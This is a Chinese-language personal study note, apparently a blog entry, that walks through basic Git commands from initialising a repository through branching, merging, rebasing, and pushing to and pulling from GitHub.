目录里存储着管理当前目录内容所需的仓库数据到这就初始化成功了，提示：如果再按着书操作的时候某一步操作错了不知道怎么修改的话，可以切换到git-tutorial的上一级目录，然后执行$rm -rf git-tutorial删除这个目录重新来过（为了更快熟悉这些指令(其实是自己输命令测试),我删了好几次…） $touch README.md //创建README.md文件 $vim README.md //用vim编辑README.md(vim是真的好用), vim打开后按i进入插入模式编辑，添加内容后按esc退出编辑模 式，输入:wq保存并退出 $git status //显示仓库的状态 $git add README.md //README.md编辑好之后，$git add README.md将它添加至暂存区（暂存区的文件才可以提交） $git commit -m “First commit” //git commit命令可以将当前暂存区中的文件实际保存到仓库的历史记录中。通过这些记录，我们就可以在工作树中复原文件，-m 参数后的 “First commit”称作提交信息，是对这个提交的概述，如果想详细描述的话用$git commit命令 $git log //通过$git commit提交之后，可以通过git log命令查看提交记录及该记录的其他信息，如这个命令的哈希值 $git diff 和$git diff HEAD //git diff是查看当前工作树与暂存区的差别，git diff HEAD是查看工作树与最新提交的区别 $git branch//查看当前所在分支 $git branch feature-A//建立一个新分支 $git checkout feature-A//切换到指定分支 $git checkout -b feature-A//创建一个新分支并切换到 feature-A 分支的更改不会影响到master 分支，这正是在开发中创建分支的优点。只要创建多个分支，就可以在不互相影响的情况下同时进行多个功能的开发。 $git merge –no-ff feature-A//合并分支，千万注意先切换回master分支再进行合并，为了在历史记录中明确记录下本次分支合并，我们需要创建合并提交。因此，在合并时加上 –no-ff参数 $git log –graph //git log –graph命令可以用图表形式输出提交日志，非常直观 $git reset –hard 哈希值（通过git log查看）// git reset——回溯历史版本，所有文件都回溯到了指定哈希值对应的时间点上。也要注意在master分支下操作 $git reflog //git log命令只能查看以当前状态为终点的历史日志。所以这里要使用 git reflog命令，查看当前仓库的操作日志。在日志中找出回溯历史之前的哈希值，通过 git reset –hard命令恢复到回溯历史前的状态。 $ git commit – amend——修改提交信息，提交日志中的相应内容也会被修改。 $git rebase -i //在合并特性分支之前，如果发现已提交的内容中有些许拼写错误等，不妨提交一个修改，然后将这个修改包含到前一个提交之中，压缩成一个历史记录。 $git rebase -i HEAD~2 //用上述方式执行 git rebase命令，可以选定当前分支中包含HEAD（最新提交）在内的两个最新历史记录为对象，并在编辑器中打开。 用fixup替换pick，可以将提交历史压缩。 在本地仓库操作完之后，接下来就可以推送至远程仓库了。 在Github上新建一个仓库，注意不要选择Initialize this repository with a README （自动生成README.md文件）选项，因为本地仓库自己生成了。然后上命令 $git remote add origin git@github.com:你的用户名/git-tutorial.git //在 GitHub 上创建的仓库路径为“git@github.com:用户名 /git-tutorial.git”。现在我们用 git remote add命令将它设置成本地仓库的远程仓库。按照上述格式执行 git remote add命令之后，Git 会自动将git@github.com:用户名/git-tutorial.git远程仓库的名称设置为 origin（标识符）。 $git remote remove origin //移除与远程仓库的关联 $git push -u origin master //在master分支进行该操作，像这样执行 git push命令，当前分支的内容就会被推送给远程仓库origin 的 master分支。-u参数可以在推送的同时，将origin仓库的master分支设置为本地仓库当前分支的 upstream（上游）。添加了这个参数，将来运行 git pull命令从远程仓库获取内容时，本地仓库的这个分支就可以直接从 origin 的 master 分支获取内容，省去了另外添加参数的麻烦（其实这段话只懂个大概2333，所以就照着用就好吧）。执行该操作后，当前本地仓库 master 分支的内容将会被推送到GitHub 的远程仓库中。在 GitHub 上也可以确认远程 master 分支的内容，和本地 master 分支相同。 $ git push -u origin feature-D(其他分支名) //除了 master 分支之外，远程仓库也可以创建其他分支。 从远程仓库获取 上一节中我们把在 GitHub 上新建的仓库设置成了远程仓库，并向这个仓库 push 了 feature-D 分支。现在，所有能够访问这个远程仓库的人都可以获取 feature-D 分支并加以修改。本节中我们从实际开发者的角度出发，在另一个目录下新建一个本地仓库，学习从远程仓库获取内容的相关操作。这就相当于我们刚刚执行过 push 操作的目标仓库又有了另一名新开发者来共同开发。 $ git clone git@github.com:用户名/git-tutorial.git // git clone——获取远程仓库 ，注意不要与之前操作的同名仓库在同一目录下 执行 git clone命令后我们会默认处于 master 分支下，同时系统会自动将 origin 设置成该远程仓库的标识符。也就是说，当前本地仓库的 master 分支与 GitHub 端远程仓库（origin）的 master 分支在内容上是完全相同的。 $git branch -a //用 git branch -a命令查看当前分支的相关信息。添加 -a参数可以同时显示本地仓库和远程仓库的分支信息。 $git checkout -b feature-D origin/feature-D //我们试着将 feature-D 分支获取至本地仓库 b 参数的后面是本地仓库中新建分支的名称。为了便于理解，我们仍将其命名为 feature-D，让它与远程仓库的对应分支保持同名。新建分支名称后面是获取来源的分支名称。例子中指定了 origin/feature-D，就是说以名为 origin 的仓库（这里指 GitHub 端的仓库）的 feature-D 分支为来源，在本地仓库中创建 feature-D 分支。 现在假定我们是另一名开发者，我们可以对feature-D仓库进行修改提交，完善之后通过 $git push将修改同步到Github上去。从远程仓库获取 feature-D 分支，在本地仓库中提交更改，再将feature-D 分支推送回远程仓库，通过这一系列操作，就可以与其他开发者相互合作，共同培育 feature-D 分支，实现某些功能。 $ git pull origin feature-D //获取最新的远程仓库分支 GitHub 端远程仓库中的 feature-D 分支是最新状态，如果本地仓库没有更新的话，可以通过git pull origin feature-D更新。今后只需要像平常一样在本地进行提交再 push 给远程仓库，就可以与其他开发者同时在同一个分支中进行作业，不断给 feature-D 增加新功能。如果两人同时修改了同一部分的源代码，push 时就很容易发生冲突。所以多名开发者在同一个分支中进行作业时，为减少冲突情况的发生，建议更频繁地进行 push 和 pull 操作。 就写到这里把，留个笔记，以后用来查询]]></content>
      <categories>
        <category>Study</category>
        <category>git</category>
      </categories>
      <tags>
        <tag>git learning notes</tag>
      </tags>
  </entry>
</search>
